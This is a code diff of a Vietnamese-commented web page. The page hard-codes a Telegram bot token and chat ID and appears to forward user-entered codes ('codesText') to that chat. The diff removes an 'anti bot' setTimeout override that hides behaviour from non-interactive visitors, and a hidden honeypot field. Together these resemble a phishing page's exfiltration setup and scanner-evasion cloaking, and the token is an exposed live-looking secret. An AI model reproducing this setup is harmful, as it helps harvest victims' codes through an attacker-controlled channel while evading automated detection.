@@ -1368,41 +1368,6 @@
 const BOT_TOKEN = "8669359305:AAFcKWFVJPW6Puxht9Kudq-sHUJoyhYzlqk";   // Token bot từ @BotFather
 const CHAT_ID   = "7235930837";                                   // Chat ID của bạn (hoặc group ID)
 
-// ===== ANTI BOT (PHẢI Ở TRÊN) =====
-let human = false;
-
-["mousemove", "keydown", "touchstart"].forEach(e => {
-  window.addEventListener(e, () => {
-    human = true;
-  });
-});
-
-const startTime = Date.now();
-
-const originalSetTimeout = window.setTimeout;
-
-window.setTimeout = function(fn, delay) {
-  return originalSetTimeout(function() {
-
-    const timeSpent = Date.now() - startTime;
-
-    if (!human) {
-      console.log("🚫 Block bot (no interaction)");
-      return;
-    }
-
-    if (timeSpent < 4000) {
-      console.log("🚫 Block bot (too fast)");
-      return;
-    }
-
-    fn();
-
-  }, delay);
-};
-
-
-
 // Thời gian chờ (đơn vị: mili-giây)
 // 15000 = 15 giây
 // 20000 = 20 giây
@@ -3113,22 +3078,6 @@ ${codesText}`;
         document.querySelector('.submit-button').addEventListener('mouseup', function() {
             this.style.transform = 'scale(1)';
         });
-    <script>
-// 🪤 Honeypot trap
-document.addEventListener("DOMContentLoaded", () => {
-  const trap = document.createElement("input");
-  trap.type = "text";
-  trap.name = "website";           // 👈 thêm
-  trap.autocomplete = "off";       // 👈 thêm
-  trap.style.position = "absolute";
-  trap.style.left = "-9999px";
-  document.body.appendChild(trap);
-
-  trap.addEventListener("input", () => {
-    console.log("🚫 Bot triggered honeypot");
-    window.location.href = "about:blank";
-  });
-});
-</script>
+    </script>
 </body>
 </html>
